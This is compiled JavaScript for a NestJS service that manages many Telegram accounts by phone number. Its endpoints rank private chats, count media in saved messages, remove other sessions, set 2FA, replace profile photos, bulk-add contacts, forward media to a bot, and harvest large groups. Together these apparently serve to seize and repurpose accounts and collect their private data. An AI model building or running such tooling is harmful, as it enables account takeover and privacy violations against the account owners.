    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Top private chats retrieved successfully',
        schema: {
            type: 'array',
            items: {
                type: 'object',
                properties: {
                    chatId: { type: 'string', description: 'Chat/user ID' },
                    username: { type: 'string', description: 'Username (if available)' },
                    firstName: { type: 'string', description: 'First name' },
                    lastName: { type: 'string', description: 'Last name' },
                    totalMessages: { type: 'number', description: 'Total messages in conversation' },
                    interactionScore: {
                        type: 'number',
                        description: 'Calculated engagement score (higher = more active)'
                    },
                    engagementLevel: {
                        type: 'string',
                        enum: ['recent', 'active', 'dormant'],
                        description: 'Activity classification: recent (7 days), active (7-30 days), dormant (30-90 days)'
                    },
                    lastActivityDays: {
                        type: 'number',
                        description: 'Days since last activity'
                    },
                    calls: {
                        type: 'object',
                        properties: {
                            total: { type: 'number' },
                            incoming: {
                                type: 'object',
                                properties: {
                                    total: { type: 'number' },
                                    audio: { type: 'number' },
                                    video: { type: 'number' }
                                }
                            },
                            outgoing: {
                                type: 'object',
                                properties: {
                                    total: { type: 'number' },
                                    audio: { type: 'number' },
                                    video: { type: 'number' }
                                }
                            }
                        }
                    },
                    media: {
                        type: 'object',
                        properties: {
                            photos: { type: 'number', description: 'Total photos shared' },
                            videos: { type: 'number', description: 'Total videos shared' }
                        }
                    },
                    activityBreakdown: {
                        type: 'object',
                        description: 'Percentage breakdown of interaction types',
                        properties: {
                            videoCalls: { type: 'number', description: 'Percentage from video calls' },
                            audioCalls: { type: 'number', description: 'Percentage from audio calls' },
                            mediaSharing: { type: 'number', description: 'Percentage from media sharing' },
                            textMessages: { type: 'number', description: 'Percentage from text messages' }
                        }
                    }
                }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal Server Error' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getTopPrivateChats", null);
__decorate([
    (0, common_1.Get)('messages/self-msg-info/:mobile'),
    (0, swagger_1.ApiOperation)({
        summary: 'Get statistics about media messages in saved messages',
        description: 'Retrieves comprehensive statistics about photos, videos, and movies in saved messages (self chat). ' +
            'Uses memory-efficient iterMessages for processing large message histories. ' +
            'Supports configurable limit for analysis scope (default: 500, max: 10000).'
    }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiQuery)({
        name: 'limit',
        required: false,
        type: Number,
        description: 'Maximum number of messages to analyze (default: 500, max: 10000)',
        example: 500,
        minimum: 1,
        maximum: 10000
    }),
    (0, swagger_1.ApiResponse)({
        status: 200,
        description: 'Self messages statistics retrieved successfully',
        schema: {
            type: 'object',
            properties: {
                total: { type: 'number', description: 'Total messages in saved messages' },
                photoCount: { type: 'number', description: 'Total photos' },
                videoCount: { type: 'number', description: 'Total videos' },
                movieCount: {
                    type: 'number',
                    description: 'Messages containing movie-related keywords (links, shared content)'
                },
                ownPhotoCount: { type: 'number', description: 'Photos sent by user' },
                otherPhotoCount: { type: 'number', description: 'Photos received from others' },
                ownVideoCount: { type: 'number', description: 'Videos sent by user' },
                otherVideoCount: { type: 'number', description: 'Videos received from others' },
                analyzedMessages: {
                    type: 'number',
                    description: 'Number of messages actually analyzed'
                }
            }
        }
    }),
    (0, swagger_1.ApiResponse)({ status: 400, description: 'Bad Request - invalid limit parameter' }),
    (0, swagger_1.ApiResponse)({ status: 500, description: 'Internal Server Error' }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Query)('limit')),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Number]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "getSelfMsgsInfo", null);
__decorate([
    (0, common_1.Post)('bots/add-to-channel/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Add bots to channel with admin privileges' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ schema: { type: 'object', properties: { channelIds: { type: 'array', items: { type: 'string' }, description: 'Array of channel IDs to add bots to. If not provided, will use default channels from environment variables.' } } } }),
    (0, swagger_1.ApiResponse)({ type: Object }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, Object]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "addBotsToChannel", null);
__decorate([
    (0, common_1.Post)('bot/create/:mobile'),
    (0, swagger_1.ApiOperation)({ summary: 'Create a new bot using BotFather' }),
    (0, swagger_1.ApiParam)({ name: 'mobile', description: 'Mobile number', required: true }),
    (0, swagger_1.ApiBody)({ type: dto_1.CreateTgBotDto }),
    (0, swagger_1.ApiResponse)({ type: Object, schema: { properties: { botToken: { type: 'string', description: 'The token to access HTTP Bot API' }, username: { type: 'string', description: 'The username of the created bot' } } } }),
    __param(0, (0, common_1.Param)('mobile')),
    __param(1, (0, common_1.Body)()),
    __metadata("design:type", Function),
    __metadata("design:paramtypes", [String, dto_1.CreateTgBotDto]),
    __metadata("design:returntype", Promise)
], TelegramController.prototype, "createBot", null);
exports.TelegramController = TelegramController = __decorate([
    (0, common_1.Controller)('telegram'),
    (0, swagger_1.ApiTags)('Telegram'),
    __metadata("design:paramtypes", [Telegram_service_1.TelegramService])
], TelegramController);


/***/ }),

/***/ "./src/components/Telegram/Telegram.module.ts":
/*!****************************************************!*\
  !*** ./src/components/Telegram/Telegram.module.ts ***!
  \****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramModule = void 0;
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const Telegram_controller_1 = __webpack_require__(/*! ./Telegram.controller */ "./src/components/Telegram/Telegram.controller.ts");
const Telegram_service_1 = __webpack_require__(/*! ./Telegram.service */ "./src/components/Telegram/Telegram.service.ts");
const users_module_1 = __webpack_require__(/*! ../users/users.module */ "./src/components/users/users.module.ts");
const buffer_client_module_1 = __webpack_require__(/*! ../buffer-clients/buffer-client.module */ "./src/components/buffer-clients/buffer-client.module.ts");
const active_channels_module_1 = __webpack_require__(/*! ../active-channels/active-channels.module */ "./src/components/active-channels/active-channels.module.ts");
const channels_module_1 = __webpack_require__(/*! ../channels/channels.module */ "./src/components/channels/channels.module.ts");
const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const telegram_validation_config_1 = __webpack_require__(/*! ./config/telegram-validation.config */ "./src/components/Telegram/config/telegram-validation.config.ts");
const ConfigurationInit_1 = __webpack_require__(/*! ../ConfigurationInit */ "./src/components/ConfigurationInit/index.ts");
let TelegramModule = class TelegramModule {
};
exports.TelegramModule = TelegramModule;
exports.TelegramModule = TelegramModule = __decorate([
    (0, common_1.Module)({
        imports: [
            ConfigurationInit_1.InitModule,
            (0, common_1.forwardRef)(() => users_module_1.UsersModule),
            buffer_client_module_1.BufferClientModule,
            (0, common_1.forwardRef)(() => active_channels_module_1.ActiveChannelsModule),
            (0, common_1.forwardRef)(() => channels_module_1.ChannelsModule)
        ],
        controllers: [Telegram_controller_1.TelegramController],
        providers: [
            Telegram_service_1.TelegramService,
            telegram_validation_config_1.TelegramValidationConfig,
            {
                provide: 'TELEGRAM_LOGGER',
                useValue: new telegram_logger_1.TelegramLogger('TELEGRAM_LOGGER')
            }
        ],
        exports: [Telegram_service_1.TelegramService]
    })
], TelegramModule);


/***/ }),

/***/ "./src/components/Telegram/Telegram.service.ts":
/*!*****************************************************!*\
  !*** ./src/components/Telegram/Telegram.service.ts ***!
  \*****************************************************/
/***/ (function(__unused_webpack_module, exports, __webpack_require__) {


var __createBinding = (this && this.__createBinding) || (Object.create ? (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    var desc = Object.getOwnPropertyDescriptor(m, k);
    if (!desc || ("get" in desc ? !m.__esModule : desc.writable || desc.configurable)) {
      desc = { enumerable: true, get: function() { return m[k]; } };
    }
    Object.defineProperty(o, k2, desc);
}) : (function(o, m, k, k2) {
    if (k2 === undefined) k2 = k;
    o[k2] = m[k];
}));
var __setModuleDefault = (this && this.__setModuleDefault) || (Object.create ? (function(o, v) {
    Object.defineProperty(o, "default", { enumerable: true, value: v });
}) : function(o, v) {
    o["default"] = v;
});
var __decorate = (this && this.__decorate) || function (decorators, target, key, desc) {
    var c = arguments.length, r = c < 3 ? target : desc === null ? desc = Object.getOwnPropertyDescriptor(target, key) : desc, d;
    if (typeof Reflect === "object" && typeof Reflect.decorate === "function") r = Reflect.decorate(decorators, target, key, desc);
    else for (var i = decorators.length - 1; i >= 0; i--) if (d = decorators[i]) r = (c < 3 ? d(r) : c > 3 ? d(target, key, r) : d(target, key)) || r;
    return c > 3 && r && Object.defineProperty(target, key, r), r;
};
var __importStar = (this && this.__importStar) || (function () {
    var ownKeys = function(o) {
        ownKeys = Object.getOwnPropertyNames || function (o) {
            var ar = [];
            for (var k in o) if (Object.prototype.hasOwnProperty.call(o, k)) ar[ar.length] = k;
            return ar;
        };
        return ownKeys(o);
    };
    return function (mod) {
        if (mod && mod.__esModule) return mod;
        var result = {};
        if (mod != null) for (var k = ownKeys(mod), i = 0; i < k.length; i++) if (k[i] !== "default") __createBinding(result, mod, k[i]);
        __setModuleDefault(result, mod);
        return result;
    };
})();
var __metadata = (this && this.__metadata) || function (k, v) {
    if (typeof Reflect === "object" && typeof Reflect.metadata === "function") return Reflect.metadata(k, v);
};
var __param = (this && this.__param) || function (paramIndex, decorator) {
    return function (target, key) { decorator(target, key, paramIndex); }
};
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", ({ value: true }));
exports.TelegramService = void 0;
const users_service_1 = __webpack_require__(/*! ../users/users.service */ "./src/components/users/users.service.ts");
const TelegramManager_1 = __importDefault(__webpack_require__(/*! ./TelegramManager */ "./src/components/Telegram/TelegramManager.ts"));
const common_1 = __webpack_require__(/*! @nestjs/common */ "@nestjs/common");
const cloudinary_1 = __webpack_require__(/*! ../../cloudinary */ "./src/cloudinary.ts");
const active_channels_service_1 = __webpack_require__(/*! ../active-channels/active-channels.service */ "./src/components/active-channels/active-channels.service.ts");
const path = __importStar(__webpack_require__(/*! path */ "path"));
const channels_service_1 = __webpack_require__(/*! ../channels/channels.service */ "./src/components/channels/channels.service.ts");
const parseError_1 = __webpack_require__(/*! ../../utils/parseError */ "./src/utils/parseError.ts");
const connection_manager_1 = __webpack_require__(/*! ./utils/connection-manager */ "./src/components/Telegram/utils/connection-manager.ts");
const telegram_logger_1 = __webpack_require__(/*! ./utils/telegram-logger */ "./src/components/Telegram/utils/telegram-logger.ts");
const fs = __importStar(__webpack_require__(/*! fs */ "fs"));
const Helpers_1 = __webpack_require__(/*! telegram/Helpers */ "telegram/Helpers");
const fetchWithTimeout_1 = __webpack_require__(/*! ../../utils/fetchWithTimeout */ "./src/utils/fetchWithTimeout.ts");
const telegram_1 = __webpack_require__(/*! telegram */ "telegram");
const utils_1 = __webpack_require__(/*! ../../utils */ "./src/utils/index.ts");
const channelinfo_1 = __webpack_require__(/*! ../../utils/telegram-utils/channelinfo */ "./src/utils/telegram-utils/channelinfo.ts");
let TelegramService = class TelegramService {
    constructor(usersService, activeChannelsService, channelsService) {
        this.usersService = usersService;
        this.activeChannelsService = activeChannelsService;
        this.channelsService = channelsService;
        this.logger = new telegram_logger_1.TelegramLogger('TgService');
        connection_manager_1.connectionManager.setUsersService(this.usersService);
    }
    async onModuleDestroy() {
        this.logger.info('system', 'Module destroy initiated');
    }
    getActiveClientSetup() {
        return TelegramManager_1.default.getActiveClientSetup();
    }
    setActiveClientSetup(data) {
        TelegramManager_1.default.setActiveClientSetup(data);
    }
    async getMessages(mobile, username, limit = 8) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.getMessages(username, limit);
    }
    async getMessagesNew(mobile, username, offset, limit) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.getMessagesNew(username, offset, limit);
    }
    async sendInlineMessage(mobile, chatId, message, url) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return telegramClient.sendInlineMessage(chatId, message, url);
    }
    async getChatId(mobile, username) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getchatId(username);
    }
    async getLastActiveTime(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getLastActiveTime();
    }
    async tryJoiningChannel(mobile, chatEntity) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.joinChannel(chatEntity.username);
            this.logger.debug(telegramClient.phoneNumber, `Joined channel Success: `, `@${chatEntity.username}`);
            if (chatEntity.canSendMsgs) {
            }
            else {
            }
        }
        catch (error) {
            this.logger.debug(telegramClient.phoneNumber, `Failed to join: `, `@${chatEntity.username}`);
            if (error.toString().includes("No user has")) {
                await telegramClient.client.invoke(new telegram_1.Api.account.SetPrivacy({
                    key: new telegram_1.Api.InputPrivacyKeyPhoneCall(),
                    rules: [
                        new telegram_1.Api.InputPrivacyValueDisallowAll()
                    ],
                }));
            }
            await this.removeChannels(error, chatEntity.channelId, chatEntity.username, mobile);
            throw error;
        }
    }
    ;
    async removeChannels(error, channelId, username, mobile) {
        if (error.errorMessage == "USERNAME_INVALID" || error.errorMessage == 'CHAT_INVALID' || error.errorMessage == 'USERS_TOO_MUCH' || error.toString().includes("No user has")) {
        }
        else if (error.errorMessage === "CHANNEL_PRIVATE") {
            await this.channelsService.update(channelId, { private: true });
            await this.activeChannelsService.update(channelId, { private: true });
        }
    }
    async getGrpMembers(mobile, entity) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.getGrpMembers(entity);
        }
        catch (err) {
            this.logger.error(mobile, "Error fetching group members:", err);
        }
    }
    async addContact(mobile, data, prefix) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.addContact(data, prefix);
        }
        catch (err) {
            this.logger.error(mobile, "Error fetching adding Contacts:", err);
        }
    }
    async addContacts(mobile, phoneNumbers, prefix) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            return await telegramClient.addContacts(phoneNumbers, prefix);
        }
        catch (err) {
            this.logger.error(mobile, "Error fetching adding Contacts:", err);
        }
    }
    async getSelfMsgsInfo(mobile, limit) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.getSelfMSgsInfo(limit);
        }
        catch (error) {
            this.logger.error(mobile, 'Error getting self messages info:', error);
            throw error;
        }
    }
    async createGroup(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.createGroup();
    }
    async forwardMedia(mobile, channel, fromChatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        telegramClient.forwardMedia(channel, fromChatId);
        setTimeout(async () => {
            try {
                await this.leaveChannel(mobile, "2302868706");
            }
            catch (error) {
                this.logger.debug(mobile, "Error in forwardMedia: ", error);
            }
        }, 5 * 60000);
        return "Media forward initiated";
    }
    async forwardMediaToBot(mobile, fromChatId) {
        try {
            const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
            await telegramClient.forwardMediaToBot(fromChatId);
            const dialogs = [];
            for await (const dialog of telegramClient.client.iterDialogs({ limit: 500 })) {
                dialogs.push(dialog);
            }
            const channels = dialogs
                .filter(chat => chat.isChannel || chat.isGroup)
                .map(chat => {
                const chatEntity = chat.entity;
                const cannotSendMsgs = chatEntity.defaultBannedRights?.sendMessages;
                if (!chatEntity.broadcast &&
                    !cannotSendMsgs &&
                    chatEntity.participantsCount > 50 &&
                    (0, utils_1.shouldMatch)(chatEntity)) {
                    return {
                        channelId: chatEntity.id.toString(),
                        canSendMsgs: true,
                        participantsCount: chatEntity.participantsCount,
                        private: false,
                        title: chatEntity.title,
                        broadcast: chatEntity.broadcast,
                        megagroup: chatEntity.megagroup,
                        restricted: chatEntity.restricted,
                        sendMessages: true,
                        username: chatEntity.username,
                        forbidden: false
                    };
                }
                return null;
            })
                .filter((channel) => Boolean(channel));
            await connection_manager_1.connectionManager.unregisterClient(mobile);
            await this.channelsService.createMultiple(channels);
            await this.activeChannelsService.createMultiple(channels);
            return "Media forward initiated successfully";
        }
        catch (error) {
            this.logger.error(mobile, "Error forwarding media:", error);
            return `Media forward failed: ${error.message}`;
        }
    }
    async blockUser(mobile, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.blockUser(chatId);
    }
    async joinChannel(mobile, channelId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.joinChannel(channelId);
    }
    async getCallLog(mobile, limit) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.getCallLog(limit);
        }
        catch (error) {
            this.logger.error(mobile, 'Error getting call log:', error);
            throw error;
        }
    }
    async getmedia(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getMediaMessages();
    }
    async getChannelInfo(mobile, sendIds = false) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const channels = await (0, channelinfo_1.channelInfo)(telegramClient.client, sendIds);
        return channels;
    }
    async getMe(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getMe();
    }
    async getEntity(mobile, entity) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getEntity(entity);
    }
    async createNewSession(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.createNewSession();
    }
    async set2Fa(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.set2fa();
            return '2Fa set successfully';
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Faile to Set 2FA: ${mobile}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
    }
    async updatePrivacyforDeletedAccount(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.updatePrivacyforDeletedAccount();
    }
    async deleteProfilePhotos(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
    }
    async setProfilePic(mobile, name) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.deleteProfilePhotos();
        try {
            await cloudinary_1.CloudinaryService.getInstance(name);
            await (0, Helpers_1.sleep)(2000);
            const rootPath = process.cwd();
            this.logger.debug(mobile, "checking path", rootPath);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp1.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp2.jpg'));
            await (0, Helpers_1.sleep)(3000);
            await telegramClient.updateProfilePic(path.join(rootPath, 'dp3.jpg'));
            await (0, Helpers_1.sleep)(1000);
            return 'Profile pic set successfully';
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to Set Profile Pics: ${mobile}`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
        finally {
            await connection_manager_1.connectionManager.unregisterClient(mobile);
        }
    }
    async updatePrivacy(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            await telegramClient.updatePrivacy();
            return "Privacy updated successfully";
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Failed to Update Privacy`);
            throw new common_1.HttpException(errorDetails.message, errorDetails.status);
        }
    }
    async downloadProfilePic(mobile, index) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.downloadProfilePic(index);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Error Downloading Profile Picture:`);
            this.logger.error(mobile, errorDetails.message, error);
            throw new Error("Failed to update username");
        }
    }
    async updateUsername(mobile, username) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.updateUsername(username);
        }
        catch (error) {
            const errorDetails = (0, parseError_1.parseError)(error, `Error Updating Username:`);
            this.logger.error(mobile, errorDetails.message, error);
            throw new Error("Failed to update username");
        }
    }
    async updateUsernameForAClient(mobile, clientId, clientName, currentUsername) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const [firstName, middleName = ''] = clientName.split(' ');
        const firstPart = firstName.slice(0, 4);
        const middlePart = middleName.slice(0, 3);
        const pattern = `^${firstPart}${middlePart}\\d+$`;
        const usernameRegex = new RegExp(pattern, 'i');
        if (!usernameRegex.test(currentUsername)) {
            const firstNameCaps = firstPart[0].toUpperCase() + firstPart.slice(1);
            const middleNameCaps = middlePart ? middlePart[0].toUpperCase() + middlePart.slice(1) : '';
            const baseUsername = `${firstNameCaps.slice(0, 4)}${middleNameCaps.slice(0, 3)}` + (0, utils_1.fetchNumbersFromString)(clientId) + Math.floor(Math.random() * 1000);
            return await telegramClient.updateUsername(baseUsername);
        }
        this.logger.log(mobile, "Username is already matching required regex, Skipping Username update");
        return currentUsername;
    }
    async getMediaMetadata(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.getMediaMetadata(params);
        }
        catch (error) {
            this.logger.error(mobile, 'Error getting media metadata:', error);
            throw error;
        }
    }
    async getMediaFileDownloadInfo(mobile, messageId, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            this.logger.info(mobile, 'Get media file download info', { messageId, chatId });
            return await telegramClient.getMediaFileDownloadInfo(messageId, chatId);
        }
        catch (error) {
            this.logger.error(mobile, 'Error getting media file download info:', error);
            throw error;
        }
    }
    async *streamMediaFile(mobile, fileLocation, offset, limit, requestSize) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        yield* telegramClient.streamMediaFile(fileLocation, offset, limit, requestSize);
    }
    async getThumbnail(mobile, messageId, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            this.logger.info(mobile, 'Get thumbnail', { messageId, chatId });
            return await telegramClient.getThumbnail(messageId, chatId);
        }
        catch (error) {
            this.logger.error(mobile, 'Error getting thumbnail:', error);
            throw error;
        }
    }
    async forwardMessage(mobile, toChatId, fromChatId, messageId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.forwardMessage(toChatId, fromChatId, messageId);
    }
    async leaveChannels(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const channelinfo = await (0, channelinfo_1.channelInfo)(telegramClient.client, false);
        const leaveChannelIds = channelinfo.canSendFalseChats;
        telegramClient.leaveChannels(leaveChannelIds);
        return "Left channels initiated";
    }
    async leaveChannel(mobile, channel) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        telegramClient.leaveChannels([channel]);
        return "Left channel initiated";
    }
    async deleteChat(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.deleteChat(params);
    }
    async updateNameandBio(mobile, firstName, about) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updateProfile(firstName, about);
    }
    async getDialogs(mobile, query) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const { limit = 10, offsetId, archived = false } = query;
        const chatData = [];
        for await (const chat of telegramClient.client.iterDialogs({ limit, offsetId, archived })) {
            const chatEntity = await chat.entity.toJSON();
            chatData.push(chatEntity);
        }
        return chatData;
    }
    async getConnectionStatus() {
        const status = {
            activeConnections: connection_manager_1.connectionManager.getActiveConnectionCount(),
            rateLimited: 0,
            totalOperations: 0
        };
        this.logger.info('system', 'Connection status retrieved', status);
        return status;
    }
    async forwardBulkMessages(mobile, fromChatId, toChatId, messageIds) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.forwardMessages(fromChatId, toChatId, messageIds);
    }
    async getAuths(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const auths = await telegramClient.getAuths();
        this.logger.info(mobile, 'Retrieved authorizations', {
            count: auths?.length || 0
        });
        return auths;
    }
    async removeOtherAuths(mobile) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        await telegramClient.removeOtherAuths();
        this.logger.info(mobile, 'Removed other authorizations');
        return "Removed other authorizations";
    }
    async processBatch(items, batchSize, processor, delayMs = 2000) {
        const errors = [];
        let processed = 0;
        for (let i = 0; i < items.length; i += batchSize) {
            const batch = items.slice(i, i + batchSize);
            try {
                await processor(batch);
                processed += batch.length;
                if (i + batchSize < items.length) {
                    await new Promise(resolve => setTimeout(resolve, delayMs));
                }
            }
            catch (error) {
                errors.push(error);
                this.logger.error('batch-process', 'Batch processing failed', error);
            }
        }
        return { processed, errors };
    }
    async createGroupWithOptions(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        const result = await telegramClient.createGroupOrChannel(options);
        let groupId;
        if ('chats' in result && Array.isArray(result.chats) && result.chats.length > 0) {
            const chat = result.chats[result.chats.length - 1];
            groupId = chat.id?.toString();
        }
        this.logger.info(mobile, 'Group created', { id: groupId });
        return result;
    }
    async updateGroupSettings(mobile, settings) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updateGroupSettings(settings);
    }
    async scheduleMessage(mobile, options) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.scheduleMessageSend({
            chatId: options.chatId,
            message: options.message,
            scheduledTime: options.scheduledTime,
            replyTo: options.replyTo,
            silent: options.silent
        });
    }
    async getScheduledMessages(mobile, chatId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getScheduledMessages(chatId);
    }
    async sendMediaAlbum(mobile, album) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.sendMediaAlbum(album);
        }
        catch (error) {
            this.logger.error(mobile, 'Error sending media album:', error);
            throw error;
        }
    }
    async sendMessage(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.sendMessage(params);
    }
    async sendVoiceMessage(mobile, voice) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            return await telegramClient.sendVoiceMessage(voice);
        }
        catch (error) {
            this.logger.error(mobile, 'Error sending voice message:', error);
            throw error;
        }
    }
    async cleanupChat(mobile, cleanup) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.cleanupChat(cleanup);
    }
    async getChatStatistics(mobile, chatId, period) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.getChatStatistics(chatId, period);
    }
    async updatePrivacyBatch(mobile, settings) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.updatePrivacyBatch(settings);
    }
    async addGroupMembers(mobile, groupId, members) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.addGroupMembers(groupId, members);
    }
    async removeGroupMembers(mobile, groupId, members) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.removeGroupMembers(groupId, members);
    }
    async promoteToAdmin(mobile, groupId, userId, permissions, rank) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        return await telegramClient.promoteToAdmin(groupId, userId, permissions, rank);
    }
    async demoteAdmin(mobile, groupId, userId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Demoted admin to regular member', { groupId, userId });
        return await telegramClient.demoteAdmin(groupId, userId);
    }
    async unblockGroupUser(mobile, groupId, userId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Unblocked user in group', { groupId, userId });
        return await telegramClient.unblockGroupUser(groupId, userId);
    }
    async getGroupAdmins(mobile, groupId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get group admins', { groupId });
        return await telegramClient.getGroupAdmins(groupId);
    }
    async getGroupBannedUsers(mobile, groupId) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Get group banned users', { groupId });
        return await telegramClient.getGroupBannedUsers(groupId);
    }
    async searchMessages(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Search messages', params);
        return await telegramClient.searchMessages(params);
    }
    async getFilteredMedia(mobile, params) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        try {
            this.logger.info(mobile, 'Get filtered media', params);
            return await telegramClient.getFilteredMedia(params);
        }
        catch (error) {
            this.logger.error(mobile, 'Error getting filtered media:', error);
            throw error;
        }
    }
    async exportContacts(mobile, format, includeBlocked = false) {
        const telegramClient = await connection_manager_1.connectionManager.getClient(mobile);
        this.logger.info(mobile, 'Export contacts', { format, includeBlocked });
